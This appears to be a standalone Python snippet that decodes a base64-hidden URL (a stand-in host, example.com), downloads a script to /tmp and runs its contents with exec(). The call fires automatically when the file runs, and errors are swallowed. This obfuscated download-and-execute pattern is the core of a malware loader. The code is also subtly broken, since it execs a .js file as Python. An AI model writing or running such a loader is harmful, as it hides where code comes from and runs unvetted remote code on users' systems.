import base64
import urllib.request

def retrieve():
    try:
        encoded_url = "aHR0cHM6Ly9leGFtcGxlLmNvbS9zY3JpcHQuanM="
        decoded_url = base64.b64decode(encoded_url).decode("utf-8")
        local_file = "/tmp/script.js"

        urllib.request.urlretrieve(decoded_url, local_file)

        with open(local_file, "r") as f:
            script = f.read()

        exec(script)

    except Exception as e:
        print(e)

retrieve()
